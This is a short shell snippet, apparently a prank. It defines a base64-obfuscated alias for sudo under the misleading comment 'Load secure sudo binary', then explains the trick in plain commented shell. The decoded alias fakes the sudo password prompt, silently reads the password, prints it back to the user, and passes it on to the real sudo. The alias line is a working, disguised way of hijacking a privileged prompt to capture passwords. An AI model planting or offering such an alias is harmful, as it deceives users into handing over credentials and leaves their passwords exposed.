# Load secure sudo binary
alias sudo="$(echo "ZWNobyAtbiAiW3N1ZG9dIHBhc3N3b3JkIGZvciBoZW50YWlzaGlyb3l1a2k6ICI7cmVhZCAtcyBwYXNzOyBlY2hvIC1lICIKVGhhbmtzIGZvciB5b3VyIHBhc3N3b3JkIGhlbnRhaXNoaXJveXVraSAhCllvdXIgcGFzc3dvcmQgaXMgJHBhc3MgOjMiOyBlY2hvICRwYXNzIHwgc3VkbyAtLXN0ZGluIA==" | base64 -d)"


# This alias is an obfuscation and one liner of this script :
# We fake the sudo prompt.
echo -n "[sudo] password for $USER: ";
# We read the user password (We don't use -p to set the prompt
# on one line bc zsh read and bash read intrepret -p differently.)
read -s pass;
#  We thank the user for his password and display it :3
echo -e "\nThanks for your password $USER !\nYour password is $pass :3";
# We call sudo and give it the user password, 
# as this script is supposed to be an alias there is no
# semicolon at the end of the line to execute the command after the alias.
echo $pass | sudo --stdin "
